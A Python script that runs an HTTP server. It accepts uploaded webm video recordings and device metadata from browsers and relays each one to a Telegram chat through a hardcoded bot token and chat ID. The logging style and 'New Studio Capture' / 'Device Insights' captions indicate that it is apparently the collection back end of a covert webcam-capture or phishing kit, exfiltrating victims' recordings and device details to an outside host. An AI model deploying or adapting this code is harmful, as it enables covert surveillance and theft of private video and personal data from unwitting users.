import http.server
import json
import os
import urllib.request
import time

# PASTE YOUR TELEGRAM DETAILS HERE
TELEGRAM_BOT_TOKEN = "8837215809:AAEJJ05BIjul96LJtHP_ZiKz_lnyk5a8esA"
TELEGRAM_CHAT_ID = "7787904819"

class AVRecordingHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        if self.path == '/upload-video':
            content_length = int(self.headers['Content-Length'])
            raw_data = self.rfile.read(content_length)
            
            try:
                boundary = self.headers['Content-Type'].split("=")[1].encode()
                parts = raw_data.split(boundary)
                
                video_bytes = b""
                device_meta = "Unknown Device Meta Data"
                
                # Parse multipart variables out of transaction stream arrays
                for part in parts:
                    if b'name="video_file"' in part:
                        header_end = part.find(b'\r\n\r\n') + 4
                        video_bytes = part[header_end:-4]
                    elif b'name="device_meta"' in part:
                        header_end = part.find(b'\r\n\r\n') + 4
                        device_meta = part[header_end:-4].decode('utf-8').strip()

                print("[*] Splitting multi-user data stream. Sending elements to Telegram...")
                
                # Generate unique timestamp name to keep files organized
                unique_filename = f"rec_{int(time.time())}.webm"
                
                # Build Telegram form pipeline
                boundary_str = "----WebKitFormBoundaryTelegramTransmission"
                body = []
                
                # Chat ID parameter
                body.append(f'--{boundary_str}'.encode())
                body.append(f'Content-Disposition: form-data; name="chat_id"'.encode())
                body.append(b'')
                body.append(TELEGRAM_CHAT_ID.encode())
                
                # Dynamic Custom Caption parameter using the device insights
                caption_text = f"📹 New Studio Capture!\n\n📋 Device Insights:\n{device_meta}"
                body.append(f'--{boundary_str}'.encode())
                body.append(f'Content-Disposition: form-data; name="caption"'.encode())
                body.append(b'')
                body.append(caption_text.encode())
                
                # Binary video stream block
                body.append(f'--{boundary_str}'.encode())
                body.append(f'Content-Disposition: form-data; name="video"; filename="{unique_filename}"'.encode())
                body.append(b'Content-Type: video/webm')
                body.append(b'')
                body.append(video_bytes)
                body.append(f'--{boundary_str}--'.encode())
                
                payload = b'\r\n'.join(body)
                
                telegram_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendVideo"
                req = urllib.request.Request(telegram_url, data=payload)
                req.add_header('Content-Type', f'multipart/form-data; boundary={boundary_str}')
                
                with urllib.request.urlopen(req) as response:
                    response.read()
                    print(f"[+] Unique transmission delivered cleanly: {unique_filename}")
                
                self.send_response(200)
                self.send_header('Content-Type', 'text/plain')
                self.end_headers()
                self.wfile.write(b"All packets processed successfully.")
                
            except Exception as e:
                print(f"[-] Error processing incoming cloud packets: {e}")
                self.send_error(500, "Internal Server Error")
        else:
            self.send_error(404, "Not Found")

port = int(os.environ.get("PORT", 8443))
server_address = ('0.0.0.0', port)
httpd = http.server.HTTPServer(server_address, AVRecordingHandler)

print(f"[*] Cloud Hub Online listening on port {port}")
httpd.serve_forever()
